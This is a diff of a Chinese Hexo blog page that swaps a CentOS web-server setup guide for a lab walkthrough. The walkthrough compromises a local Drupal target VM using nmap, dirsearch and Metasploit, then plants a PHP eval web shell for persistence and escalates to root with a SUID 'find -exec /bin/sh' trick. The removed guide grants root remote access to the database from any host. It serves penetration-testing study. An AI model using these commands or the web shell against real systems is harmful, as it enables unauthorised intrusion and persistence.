@@ -17,25 +17,37 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>十三，CentOS搭建网站 | Hexo</title>
-  <meta name="description" content="一、下载CentOS清华大学开源软件镜像：https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;，下载CentOS-vault 7.9.2版本–&gt;isos–&gt;x86_64  二、安装CentOS打开虚拟机，新建虚拟机，典型安装，设置安装路径，一直点击下一步，设置语言，网络配置开启，安装地址选择 然后设置root密码，等待加载 三、配置CentOS1.rm -f &#x2F;">
+  <title>三十一，通过IP获得服务器权限 | Hexo</title>
+  <meta name="description" content="1，获得IP地址靶机与Kali在同一VMware中，可先查看靶机的MAC地址，可点击设置—&gt;网络适配器—&gt;高级，找到MAC地址为:00:0C:29:60:07:93   先查看当前Kali的IP为：192.168.2.100   在Kali中ping 该网段中的所有存在的地址，并对比MAC地址，找到靶机的IP为：192.168.2.119 1nmap -sn 192.168.2.100">
 <meta property="og:type" content="article">
-<meta property="og:title" content="十三，CentOS搭建网站">
-<meta property="og:url" content="http://example.com/2023/11/20/%E5%8D%81%E4%B8%89%EF%BC%8CCentOS%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/index.html">
+<meta property="og:title" content="三十一，通过IP获得服务器权限">
+<meta property="og:url" content="http://example.com/2024/01/01/%E4%B8%89%E5%8D%81%E4%B8%80%EF%BC%8C%E9%80%9A%E8%BF%87IP%E8%8E%B7%E5%BE%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90/index.html">
 <meta property="og:site_name" content="baiQstar的博客">
-<meta property="og:description" content="一、下载CentOS清华大学开源软件镜像：https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;，下载CentOS-vault 7.9.2版本–&gt;isos–&gt;x86_64  二、安装CentOS打开虚拟机，新建虚拟机，典型安装，设置安装路径，一直点击下一步，设置语言，网络配置开启，安装地址选择 然后设置root密码，等待加载 三、配置CentOS1.rm -f &#x2F;">
+<meta property="og:description" content="1，获得IP地址靶机与Kali在同一VMware中，可先查看靶机的MAC地址，可点击设置—&gt;网络适配器—&gt;高级，找到MAC地址为:00:0C:29:60:07:93   先查看当前Kali的IP为：192.168.2.100   在Kali中ping 该网段中的所有存在的地址，并对比MAC地址，找到靶机的IP为：192.168.2.119 1nmap -sn 192.168.2.100">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/apyheoies/picgo@main//imgimage-20231120194808047.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/apyheoies/picgo@main//imgimage-20231120200010024.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/apyheoies/picgo@main//imgimage-20231120200914950.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/apyheoies/picgo@main//imgimage-20231120200841896.png">
-<meta property="article:published_time" content="2023-11-20T12:30:19.000Z">
-<meta property="article:modified_time" content="2023-11-20T12:34:04.000Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011635539.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011642206.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011700091.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011814075.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011710382.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011722855.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011724642.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011728657.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011731742.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011737423.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011739915.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011741041.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011813799.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011805724.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011813613.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011812296.png">
+<meta property="article:published_time" content="2024-01-01T08:28:46.000Z">
+<meta property="article:modified_time" content="2024-01-01T10:18:10.683Z">
 <meta property="article:author" content="白易安">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/apyheoies/picgo@main//imgimage-20231120194808047.png">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011635539.png">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://example.com/2023/11/20/%E5%8D%81%E4%B8%89%EF%BC%8CCentOS%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/index.html">
+  <link rel="canonical" href="http://example.com/2024/01/01/%E4%B8%89%E5%8D%81%E4%B8%80%EF%BC%8C%E9%80%9A%E8%BF%87IP%E8%8E%B7%E5%BE%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90/index.html">
   
     <link rel="alternate" href="/atom.xml" title="baiQstar的博客" type="application/atom+xml">
   
@@ -331,14 +343,14 @@
   
 <main class="main" role="main">
   <div class="content">
-  <article id="post-十三，CentOS搭建网站" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-三十一，通过IP获得服务器权限" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      十三，CentOS搭建网站
+      三十一，通过IP获得服务器权限
     </h1>
   
 
@@ -346,8 +358,8 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2023/11/20/%E5%8D%81%E4%B8%89%EF%BC%8CCentOS%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/" class="article-date">
-	  <time datetime="2023-11-20T12:30:19.000Z" itemprop="datePublished">2023-11-20</time>
+	<a href="/2024/01/01/%E4%B8%89%E5%8D%81%E4%B8%80%EF%BC%8C%E9%80%9A%E8%BF%87IP%E8%8E%B7%E5%BE%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90/" class="article-date">
+	  <time datetime="2024-01-01T08:28:46.000Z" itemprop="datePublished">2024-01-01</time>
 	</a>
 </span>
         
@@ -355,64 +367,64 @@
 
         
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/11/20/%E5%8D%81%E4%B8%89%EF%BC%8CCentOS%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/#comments" class="article-comment-link">评论</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2024/01/01/%E4%B8%89%E5%8D%81%E4%B8%80%EF%BC%8C%E9%80%9A%E8%BF%87IP%E8%8E%B7%E5%BE%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90/#comments" class="article-comment-link">评论</a></span>
         
       </div>
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <hr>
-<h3 id="一、下载CentOS"><a href="#一、下载CentOS" class="headerlink" title="一、下载CentOS"></a>一、下载CentOS</h3><p>清华大学开源软件镜像：<a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/%EF%BC%8C%E4%B8%8B%E8%BD%BDCentOS-vault">https://mirrors.tuna.tsinghua.edu.cn/，下载CentOS-vault</a> 7.9.2版本–&gt;isos–&gt;x86_64</p>
-<p><img src="https://cdn.jsdelivr.net/gh/apyheoies/picgo@main//imgimage-20231120194808047.png" alt="image-20231120194808047"></p>
-<h3 id="二、安装CentOS"><a href="#二、安装CentOS" class="headerlink" title="二、安装CentOS"></a>二、安装CentOS</h3><p>打开虚拟机，新建虚拟机，典型安装，设置安装路径，一直点击下一步，设置语言，网络配置开启，安装地址选择</p>
-<p>然后设置root密码，等待加载</p>
-<h3 id="三、配置CentOS"><a href="#三、配置CentOS" class="headerlink" title="三、配置CentOS"></a>三、配置CentOS</h3><p>1.<code>rm -f /var/run/yum.pid</code>     清理睡眠状态</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">rm -f /var/run/yum.pid</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=3306/tcp</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=3306/udp</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=80/tcp</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=80/udp</span><br><span class="line">firewall-cmd --reload   #复制这几行代码到CentOS</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">yum remove mariadb-libs.x86_64</span><br><span class="line">yum install httpd -y</span><br><span class="line">systemctl enable httpd</span><br><span class="line">systemctl restart httpd</span><br><span class="line">systemctl status httpd</span><br><span class="line">yum -y install mariadb mariadb-server</span><br><span class="line">systemctl enable mariadb</span><br><span class="line">systemctl start mariadb</span><br><span class="line">mysql_secure_installation</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        <h4><span id="1获得ip地址">1，获得IP地址</span></h4><p>靶机与Kali在同一VMware中，可先查看靶机的MAC地址，可点击设置—&gt;网络适配器—&gt;高级，找到MAC地址为:00:0C:29:60:07:93</p>
+<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011635539.png" alt="image-20240101163424971" style="zoom:80%;">
 
-<p>2.开放防火墙</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --zone=public --add-port=3306/tcp</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=3306/udp</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=80/tcp</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=80/udp</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
+<p>先查看当前Kali的IP为：192.168.2.100</p>
+<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011642206.png" alt="image-20240101164133597" style="zoom:80%;">
 
-<p>3.关闭selinux</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/selinux/config</span><br><span class="line">将SELINUX=enforcing这一行修改为SELINUX=disabled</span><br></pre></td></tr></table></figure>
+<p>在Kali中ping</p>
+<p>该网段中的所有存在的地址，并对比MAC地址，找到靶机的IP为：192.168.2.119</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.2.100/24</span><br></pre></td></tr></table></figure>
 
-<p>4.reboot</p>
-<p>5.删除默认数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep mariadb 查找出默认数据库mariadb的包名。</span><br><span class="line">yum remove mariadb-libs.x86_64    删除</span><br></pre></td></tr></table></figure>
-
-<ol start="6">
-<li></li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum install httpd -y</span><br><span class="line">systemctl enable httpd</span><br><span class="line">systemctl restart httpd</span><br><span class="line">systemctl status httpd           //查看服务状态</span><br><span class="line">此时访问成功回显apache测试页，网站根目录/var/www/html</span><br></pre></td></tr></table></figure>
-
-<p>7.安装mysql</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum -y install mariadb mariadb-server</span><br><span class="line">systemctl enable mariadb</span><br><span class="line">systemctl start mariadb</span><br><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure>
+<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011700091.png" alt="image-20240101170049669" style="zoom:80%;">
 
 
 
-<p>8.进行MySQL设置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Enter current password for root (enter for none):&lt;–初次运行直接回车Set root password? [Y/n]&lt;– 是否设置root用户密码，输入y并回车或直接回车</span><br><span class="line">New password:&lt;– 设置root用户的密码</span><br><span class="line">Re-enter new password:&lt;– 再输入一次你设置的密码</span><br><span class="line">其他配置</span><br><span class="line">Remove anonymous users? [Y/n]&lt;– 是否删除匿名用户，回车</span><br><span class="line">Disallow root login remotely? [Y/n]&lt;–是否禁止root远程登录,回车,</span><br><span class="line">Remove test database and access to it? [Y/n]&lt;– 是否删除test数据库，回车</span><br><span class="line">Reload privilege tables now? [Y/n]&lt;– 是否重新加载权限表，回车</span><br><span class="line"></span><br><span class="line">初始化MariaDB完成，接下来测试登录</span><br><span class="line">mysql -uroot -p你的密码</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;你的密码的明文&#x27; WITH GRANT OPTION;      </span><br><span class="line">FLUSH PRIVILEGES;                  远程登陆</span><br><span class="line">完成。</span><br></pre></td></tr></table></figure>
+<h4><span id="2扫描靶机的ip有哪些开放的端口">2，扫描靶机的IP有哪些开放的端口</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map -p1-500 -v 192.168.2.119</span><br></pre></td></tr></table></figure>
 
+<img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011814075.png" alt="image-20240101170542451" style="zoom:80%;">
 
+<p>通过上图可以看到，靶机开放了22，80，111三个端口，其中80端口时http服务端口，用浏览器打开看看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011710382.png" alt="image-20240101170756980"></p>
+<p>尝试用admin-admin&#x2F;admin123等弱密码登录，无法成功</p>
+<h4><span id="3目录扫描寻找有关漏洞信息的文件">3，目录扫描，寻找有关漏洞信息的文件</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.2.119&quot; -x 403,404 </span><br></pre></td></tr></table></figure>
 
-<p>9.php安装</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  a. rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm </span><br><span class="line">  b. yum -y remove php*</span><br><span class="line">  c. yum -y install php72w php72w-cli php72w-fpm php72w-common php72w-devel php72w-embedded php72w-gd php72w-mbstring php72w-mysqlnd php72w-opcache php72w-pdo php72w-xml</span><br><span class="line">  d. systemctl enable php-fpm.service </span><br><span class="line">systemctl start php-fpm.service</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011722855.png" alt="image-20240101172225232"></p>
+<p>将以上文件在浏览器中打开看看</p>
+<p>在<a target="_blank" rel="noopener" href="http://192.168.2.119/UPGRADE.txt%E4%B8%AD%E5%8F%91%E7%8E%B0">http://192.168.2.119/UPGRADE.txt中发现</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011724642.png" alt="image-20240101172428761"></p>
+<p>发现该网站是用Drupal技术搭建的，且版本为7.10之前</p>
+<p>去官网查看版本，发现这是2015年的版本了，说明其可能存在漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011728657.png" alt="image-20240101172813357"></p>
+<h4><span id="4用msfconsole获得shell">4，用msfconsole获得shell</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole				打开msfconsole	</span><br><span class="line">search drupal			查看drupal有哪些漏洞</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011731742.png" alt="image-20240101173155499"></p>
+<p>在以上漏洞中，我们选择2016年及其之后的使用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011737423.png" alt="image-20240101173717721"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011739915.png" alt="image-20240101173837046"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011741041.png" alt="image-20240101174143572"></p>
+<h4><span id="5权限维持">5,权限维持</span></h4><p>在Kali中创建1.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<ol start="10">
-<li>配置Apache解析php文件并自动关联</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">10.  a. vi /etc/httpd/conf/httpd.conf</span><br><span class="line">      b. 找到：DirectoryIndex index.html改为：DirectoryIndex index.html index.htm index.php</span><br><span class="line">      c. 找到：AddType application/x-gzip .gz .tgz在该行下面添加：AddType application/x-httpd-php .php</span><br><span class="line">      d. 重启Apache：systemctl restart httpd</span><br><span class="line">      e. 在浏览器输入服务器IP地址或者绑定的域名访问即可，html文件下是网站主目录，如果是里面有个文件夹才是主目录可以在配置文件修改主目录路径，或者在IP地址访问后面加上文件夹名字。</span><br></pre></td></tr></table></figure>
+<p>kala进入桌面的文件夹下后开启简易的web服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m thhp.server 8081</span><br></pre></td></tr></table></figure>
 
-<h3 id="四、移动php文件"><a href="#四、移动php文件" class="headerlink" title="四、移动php文件"></a>四、移动php文件</h3><p>1.找到WWW文件夹，解压，然后就在这个目录下打开cmd输入<code>scp -r .\WWW.zip root@CentOSip地址:\var\www\html\</code>，输入root密码</p>
-<p><img src="https://cdn.jsdelivr.net/gh/apyheoies/picgo@main//imgimage-20231120200010024.png" alt="image-20231120200010024"></p>
-<p>2.在CentOS中把刚才的WWW.zip解压到当前文件夹&#x2F;html</p>
-<p><img src="https://cdn.jsdelivr.net/gh/apyheoies/picgo@main//imgimage-20231120200914950.png" alt="image-20231120200914950"></p>
-<p>3.打开Navicat，创建新的MySql连接</p>
-<img src="https://cdn.jsdelivr.net/gh/apyheoies/picgo@main//imgimage-20231120200841896.png" alt="image-20231120200841896" style="zoom:67%;" />
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011813799.png" alt="image-20240101175234817"></p>
+<p>在拿到的shell中下载该1.php文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011805724.png" alt="image-20240101180545308"></p>
+<h4><span id="6提升权限">6,提升权限</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -name cron.php -exec &quot;/bin/sh&quot; \; </span><br></pre></td></tr></table></figure>
 
-<p>用户名：root  密码为之前为MariaDB的密码，连接成功后把你需要的数据库复制到这里就可以。</p>
-<p>数据库连接成功后就可以打开你的网站了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011813613.png" alt="image-20240101180855301"></p>
+<h4><span id="7结果">7，结果</span></h4><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011812296.png" alt="image-20240101181246805"></p>
 <hr>
 
       
@@ -423,7 +435,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="http://example.com/2023/11/20/%E5%8D%81%E4%B8%89%EF%BC%8CCentOS%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/" title="十三，CentOS搭建网站" target="_blank" rel="external">http://example.com/2023/11/20/十三，CentOS搭建网站/</a>
+      <a href="http://example.com/2024/01/01/%E4%B8%89%E5%8D%81%E4%B8%80%EF%BC%8C%E9%80%9A%E8%BF%87IP%E8%8E%B7%E5%BE%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90/" title="三十一，通过IP获得服务器权限" target="_blank" rel="external">http://example.com/2024/01/01/三十一，通过IP获得服务器权限/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -469,13 +481,9 @@
   
   <ul class="pager pull-left">
     
-    <li class="prev">
-      <a href="/2023/11/21/%E5%8D%81%E5%9B%9B%EF%BC%8CCentOS%E5%AE%89%E8%A3%85docker%E5%B9%B6%E4%BD%BF%E7%94%A8/" title="十四，CentOS安装docker并使用"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
-    </li>
-    
     
     <li class="next">
-      <a href="/2023/11/15/%E5%8D%81%E4%BA%8C%EF%BC%8C%E7%BD%91%E7%AB%99%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D/" title="十二，网站问题修复"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+      <a href="/2023/12/28/%E4%B8%89%E5%8D%81%EF%BC%8CSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/" title="三十，SQL注入绕过"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
     
     
